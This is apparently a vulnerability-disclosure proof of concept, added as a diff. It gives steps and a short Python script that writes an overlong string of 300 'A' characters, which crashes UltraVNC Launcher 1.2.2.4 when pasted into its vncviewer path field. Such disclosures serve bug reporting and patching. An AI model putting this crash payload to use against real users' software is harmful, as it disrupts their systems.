@@ -1,0 +1,22 @@
+#Exploit Title: UltraVNC Launcher 1.2.2.4 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-04-14
+#Vendor Homepage: https://www.uvnc.com/
+#Software Link: https://www.uvnc.com/downloads/ultravnc/126-download-ultravnc-1224.html
+#Tested Version: 1.2.2.4
+#Tested on: Windows 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: UltraVNC_Launcher_1.2.2.4.py
+#2.- Open UltraLauncher.txt and copy content to clipboard
+#3.- Open UltraVNC Launcher
+#4.- Select "Properties"
+#5.- In "Path vncviewer.exe" Paste Clipboard
+#6.- Click on "OK"
+#7.- Crashed
+
+cod = "\x41" * 300
+
+f = open('UltraLauncher.txt', 'w')
+f.write(cod)
+f.close()
